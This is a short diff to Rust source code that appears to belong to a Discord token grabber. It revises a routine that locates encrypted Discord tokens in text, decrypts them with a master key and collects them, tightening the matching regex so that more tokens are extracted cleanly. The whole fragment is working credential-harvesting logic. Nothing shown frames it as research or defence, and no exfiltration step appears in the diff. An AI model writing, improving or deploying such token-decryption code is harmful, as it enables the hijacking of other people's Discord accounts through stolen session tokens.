@@ -493,11 +493,10 @@ fn decrypt_discord_token(master_key: &[u8], encrypted_token_b64: &str) -> Option
 fn extract_tokens_from_text(text: &str, master_key: Option<&[u8]>, encrypted_tokens: &mut Vec<String>, plain_tokens: &mut Vec<String>) {
     // 1. Decrypt dQw4w9WgXcQ: encrypted tokens first
     if let Some(key) = master_key {
-        if let Ok(re_enc) = Regex::new(r#"dQw4w9WgXcQ:([^\s"\\]+)"#) {
+        if let Ok(re_enc) = Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]{20,})") {
             for cap in re_enc.captures_iter(text) {
                 if let Some(enc_b64) = cap.get(1) {
-                    let cleaned = enc_b64.as_str().trim_matches('"').trim_matches('\\');
-                    if let Some(decrypted) = decrypt_discord_token(key, cleaned) {
+                    if let Some(decrypted) = decrypt_discord_token(key, enc_b64.as_str()) {
                         if !encrypted_tokens.contains(&decrypted) {
                             encrypted_tokens.push(decrypted);
                         }
